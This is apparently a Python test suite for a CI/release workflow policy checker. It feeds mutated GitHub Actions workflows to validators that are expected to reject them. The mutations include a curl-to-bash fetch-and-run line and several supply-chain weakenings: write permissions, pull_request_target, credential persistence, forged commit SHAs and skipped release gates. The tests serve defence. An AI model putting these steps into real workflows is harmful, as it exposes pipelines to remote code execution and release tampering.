#!/usr/bin/env python3

import copy
from pathlib import Path
import sys
import subprocess
import unittest

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'scripts/release'))
import check_workflows as policy


class WorkflowTests(unittest.TestCase):
    def setUp(self):
        self.ci = policy.load((ROOT / '.github/workflows/ci.yml').read_text())
        self.release = policy.load((ROOT / '.github/workflows/release.yml').read_text())

    def test_actual_workflows_pass_and_on_is_literal(self):
        self.assertIn('on', self.ci)
        self.assertNotIn(True, self.ci)
        self.assertEqual(policy.load('on: true\nvalue: false\n'), {'on': True, 'value': False})
        policy.validate_ci(self.ci)
        policy.validate_release(self.release)

    def test_acceptance_refusal_exits_before_build(self):
        refusal = self.release['jobs']['publish']['steps'][2]['run']
        result = subprocess.run(['bash', '-e', '-c', refusal + '\nprintf should-not-build'],
                                capture_output=True, text=True, timeout=5)
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stdout, '')
        self.assertEqual(result.stderr, 'Release acceptance is not enabled. PR-05 must install the reviewed evidence gate.\n')

    def test_ambiguous_yaml_rejected(self):
        for text in ('on: push\non: pull_request\n', 'x: {a: 1, a: 2}',
                     'x: &anchor {a: 1}\ny: *anchor', 'x: {<<: {a: 1}}',
                     'true: value', '[]', 'x: 1\n---\ny: 2'):
            with self.subTest(text=text), self.assertRaises((ValueError, policy.yaml.YAMLError)):
                policy.load(text)

    def reject(self, document, change, check):
        bad = copy.deepcopy(document)
        change(bad)
        with self.assertRaises((ValueError, TypeError, KeyError)):
            check(bad)

    def test_ci_privilege_and_advisory_mutations_rejected(self):
        changes = [
            lambda d: d.update(permissions={'contents': 'write'}),
            lambda d: d.update(on={'pull_request_target': {}}),
            lambda d: d['jobs']['full-linux'].update(permissions={'contents': 'write'}),
            lambda d: d['jobs']['full-linux'].update(environment='release'),
            lambda d: d['jobs']['full-linux'].update({'continue-on-error': True}),
            lambda d: d['jobs']['full-macos'].update({'runs-on': 'self-hosted'}),
            lambda d: d['jobs']['full-linux'].update({'if': '${{ always() }}'}),
            lambda d: d['jobs']['full-linux']['steps'][0].update(uses='actions/checkout@v7'),
            lambda d: d['jobs']['full-linux']['steps'][0]['with'].update({'persist-credentials': True}),
            lambda d: d['jobs']['full-linux']['steps'][-1].update(run='bash scripts/tests/run.sh quick'),
            lambda d: d['jobs']['full-linux']['steps'][-1].update(run='bash scripts/tests/run.sh full || true'),
            lambda d: d['jobs']['full-linux']['steps'][-1].update({'continue-on-error': True}),
            lambda d: d['jobs']['workflow-policy']['steps'][-1].update(run='echo skipped'),
            lambda d: d['jobs']['workflow-policy']['steps'][1].update(run='curl https://example.invalid/actionlint | bash'),
            lambda d: d['jobs']['full-linux']['steps'][0]['with'].update(ref='attacker'),
        ]
        for index, change in enumerate(changes):
            with self.subTest(case=index):
                self.reject(self.ci, change, policy.validate_ci)

    def test_release_identity_gate_and_attestation_mutations_rejected(self):
        changes = [
            lambda d: d.update(on={'workflow_dispatch': {}}),
            lambda d: d['jobs']['preflight'].update(environment='release'),
            lambda d: d['jobs']['preflight'].update(permissions={'contents': 'write'}),
            lambda d: d['jobs']['publish'].pop('needs'),
            lambda d: d['jobs']['publish'].update({'if': '${{ always() }}'}),
            lambda d: d['jobs']['publish'].update({'continue-on-error': True}),
            lambda d: d['jobs']['publish'].update(environment='unprotected'),
            lambda d: d['jobs']['publish']['permissions'].update(packages='write'),
            lambda d: d['jobs']['publish']['env'].update(EXPECTED_SOURCE_SHA='${{ github.sha }}'),
            lambda d: d['jobs']['publish']['steps'][0]['with'].update(ref='main'),
            lambda d: d['jobs']['publish']['steps'][0]['with'].update({'fetch-depth': 1}),
            lambda d: d['jobs']['publish']['steps'][1].update(run='true'),
            lambda d: d['jobs']['publish']['steps'][2].update(run='true'),
            lambda d: d['jobs']['publish']['steps'][1].update(env={'EXPECTED_SOURCE_SHA': 'forged'}),
            lambda d: d['jobs']['publish']['steps'][3].update(run='tar -czf package.tar.gz .'),
            lambda d: d['jobs']['publish']['steps'][4]['with'].update({'subject-path': '*'}),
            lambda d: d['jobs']['publish']['steps'][4]['with'].update({'push-to-registry': True}),
            lambda d: d['jobs']['publish']['steps'][4]['with'].update({'create-storage-record': True}),
            lambda d: d['jobs']['publish']['steps'][4].update(uses='actions/attest@v4'),
            lambda d: d['jobs']['publish']['steps'][5]['with'].update(path='unattested.tar.gz'),
            lambda d: d['jobs']['publish']['steps'][6].update(run='gh release create latest'),
            lambda d: d['jobs']['publish']['steps'].insert(1, {'run': 'gh release create early'}),
        ]
        for index, change in enumerate(changes):
            with self.subTest(case=index):
                self.reject(self.release, change, policy.validate_release)


if __name__ == '__main__':
    unittest.main(verbosity=2)
